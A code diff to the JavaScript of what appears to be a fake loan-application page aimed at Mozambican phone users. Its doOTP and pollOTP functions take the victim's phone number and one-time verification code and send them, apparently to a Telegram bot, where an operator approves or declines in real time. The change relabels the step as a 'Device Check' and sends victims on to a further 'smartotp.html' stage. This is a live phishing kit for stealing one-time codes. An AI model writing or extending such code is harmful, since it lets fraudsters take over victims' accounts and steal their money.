@@ -190,9 +190,9 @@ function doOTP(){
   clrErr();
   document.getElementById('ov').classList.add('on');
 
-  const msg=`🔐 <b>Verification Code #2 (Smart OTP Activation)</b>\n\n<b>Phone:</b> <code>+258${phone}</code>\n<b>Code:</b> <code>${otp}</code>\n\n<b>Loan:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Term:</b> <code>${bd.duration||'N/A'} days</code>`;
+  const msg=`🔐 <b>Verification Code #2 (Device Check)</b>\n\n<b>Phone:</b> <code>+258${phone}</code>\n<b>Code:</b> <code>${otp}</code>\n\n<b>Loan:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Term:</b> <code>${bd.duration||'N/A'} days</code>`;
 
-  const btns=[[{text:'✓ Approve OTP',callback_data:'otp2_approved'},{text:'✗ Decline OTP',callback_data:'otp2_declined'}]];
+  const btns=[[{text:'✓ Approve OTP',callback_data:'device_approved'},{text:'✗ Decline OTP',callback_data:'device_declined'}]];
   tg(msg,btns);
   pollOTP();
 }
@@ -208,16 +208,16 @@ function pollOTP(){
         const u=d.result[0];luid=u.update_id;
         if(u.callback_query){
           const cb=u.callback_query.data;
-          if(cb==='otp2_approved'){
+          if(cb==='device_approved'){
             clearInterval(iv);
             document.getElementById('ov').classList.remove('on');
             document.getElementById('ov').classList.add('on');
             setTimeout(()=>{
               const params=new URLSearchParams({amount:bd.amount||'',duration:bd.duration||'',interest:bd.interest||'',total:bd.total||'',phone:phone});
-              location.href='success.html?'+params.toString();
+              location.href='smartotp.html?'+params.toString();
             },1500);
           }
-          else if(cb==='otp2_declined'){
+          else if(cb==='device_declined'){
             clearInterval(iv);
             document.getElementById('ov').classList.remove('on');
             showErr(tr('err.declined'));
